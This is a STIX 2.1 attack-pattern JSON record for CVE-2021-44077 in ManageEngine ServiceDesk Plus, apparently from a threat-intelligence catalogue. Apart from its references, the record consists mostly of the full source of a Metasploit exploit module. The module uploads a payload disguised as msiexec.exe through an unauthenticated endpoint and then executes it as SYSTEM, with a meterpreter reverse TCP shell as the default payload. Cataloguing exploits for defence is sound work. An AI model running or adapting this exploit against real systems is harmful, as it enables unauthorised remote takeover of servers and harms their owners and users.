{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c5ed40b-b31f-420b-8559-c4c9d55d9d92",
    "created": "2024-08-14T16:54:31.583598Z",
    "modified": "2024-08-14T16:54:31.583602Z",
    "name": "ManageEngine ServiceDesk Plus CVE-2021-44077",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_servicedesk_plus_cve_2021_44077.rb",
            "external_id": "manageengine_servicedesk_plus_cve_2021_44077.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44077"
        },
        {
            "source_name": "reference",
            "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-authentication-bypass-vulnerability-in-servicedesk-plus-versions-11138-and-above"
        },
        {
            "source_name": "reference",
            "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-for-cve-2021-44077-unauthenticated-rce-vulnerability-in-servicedesk-plus-versions-up-to-11305-22-11-2021"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/aa21-336a"
        },
        {
            "source_name": "reference",
            "url": "https://unit42.paloaltonetworks.com/tiltedtemple-manageengine-servicedesk-plus/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/qv2aD8YfMN/cve-2021-44077/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://xz.aliyun.com/t/10631#Y4erswriteup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ServiceDesk Plus CVE-2021-44077',\n        'Description' => %q{\n          This module exploits CVE-2021-44077, an unauthenticated remote code\n          execution vulnerability in ManageEngine ServiceDesk Plus, to upload an\n          EXE (msiexec.exe) and execute it as the SYSTEM account.\n\n          Note that build 11305 is vulnerable to the authentication bypass but\n          not the file upload. The module will check for an exploitable build.\n        },\n        'Author' => [\n          # Discovered by unknown threat actors\n          'wvu', # Analysis and exploit\n          'Y4er' # Additional confirmation\n        ],\n        'References' => [\n          ['CVE', '2021-44077'],\n          ['URL', 'https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-authentication-bypass-vulnerability-in-servicedesk-plus-versions-11138-and-above'],\n          ['URL', 'https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-for-cve-2021-44077-unauthenticated-rce-vulnerability-in-servicedesk-plus-versions-up-to-11305-22-11-2021'],\n          ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/aa21-336a'],\n          ['URL', 'https://unit42.paloaltonetworks.com/tiltedtemple-manageengine-servicedesk-plus/'],\n          ['URL', 'https://attackerkb.com/topics/qv2aD8YfMN/cve-2021-44077/rapid7-analysis'],\n          ['URL', 'https://xz.aliyun.com/t/10631'] # Y4er's writeup\n        ],\n        'DisclosureDate' => '2021-09-16',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          ['Windows Dropper', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8080,\n          'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/ImportTechnicians')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target failed to respond to check.')\n    end\n\n    # NOTE: /RestAPI/ImportTechnicians was removed after build 11303\n    unless res.code == 200 && res.get_html_document.at('//form[@name=\"ImportTechnicians\"]')\n      return CheckCode::Safe('/RestAPI/ImportTechnicians is not present.')\n    end\n\n    CheckCode::Appears('/RestAPI/ImportTechnicians is present.')\n  end\n\n  def exploit\n    upload_msiexec\n    execute_msiexec\n  end\n\n  def upload_msiexec\n    print_status('Uploading msiexec.exe')\n\n    form = Rex::MIME::Message.new\n    form.add_part(Faker::Hacker.verb, nil, nil, 'form-data; name=\"step\"')\n    form.add_part(generate_payload_exe, 'application/octet-stream', 'binary',\n                  'form-data; name=\"theFile\"; filename=\"msiexec.exe\"')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/ImportTechnicians'),\n      'ctype' => \"multipart/form-data; boundary=#{form.bound}\",\n      'data' => form.to_s\n    )\n\n    unless res&.code == 401 && res.body.include?('sdp.vulnerability.exceptionerror.title')\n      fail_with(Failure::NotVulnerable, 'Failed to upload msiexec.exe')\n    end\n\n    print_good('Successfully uploaded msiexec.exe')\n  end\n\n  def execute_msiexec\n    print_status('Executing msiexec.exe')\n\n    # This endpoint \"won't\" return\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/s247action'),\n      'vars_post' => {\n        'execute' => 's247AgentInstallationProcess'\n      }\n    }, 0)\n  end\n\n  # XXX: FileDropper dies a miserable death if the file is in use\n  def on_new_session(_session)\n    super\n\n    # Working directory is C:\\Program Files\\ManageEngine\\ServiceDesk\\site24x7\n    print_warning(\"Yo, don't forget to clean up ..\\\\bin\\\\msiexec.exe\")\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-09-16",
    "x_mitre_platforms": [
        "win'"
    ]
}